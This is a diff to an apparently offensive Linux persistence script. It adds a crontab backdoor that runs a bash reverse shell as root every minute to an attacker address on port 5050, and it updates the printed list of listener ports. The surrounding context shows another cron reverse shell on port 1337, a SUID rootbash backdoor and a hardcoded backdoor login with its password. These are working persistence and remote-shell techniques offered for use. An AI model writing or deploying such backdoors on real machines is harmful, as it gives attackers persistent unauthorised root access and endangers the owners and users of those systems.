@@ -30,6 +30,16 @@ echo "*/2 * * * * root bash -c 'bash -i >& /dev/tcp/$IP/1337 0>&1'" > /etc/cron.
 sleep 1
 
 ################################
+#        CRONTAB BACKDOOR      #
+################################
+
+echo "[+] creating crontab backdoor"
+
+echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/$IP/5050 0>&1'" >> /etc/crontab 
+
+sleep 1
+
+################################
 #        ROOT BASHRC           #
 ################################
 
@@ -134,7 +144,7 @@ echo "[!] -> /tmp/rootbash -p <- for suid backdoor"
 sleep 1
 echo "[!] Open listeners:"
 sleep 1
-echo -e "\033[96m[+] 1337 4444 5555\033[0m"
+echo -e "\033[96m[+] 1337 4444 5050 5555\033[0m"
 sleep 1
 echo -e "\033[96m[+] Login with sysbackup:Password123!\033[0m"
 sleep 1 
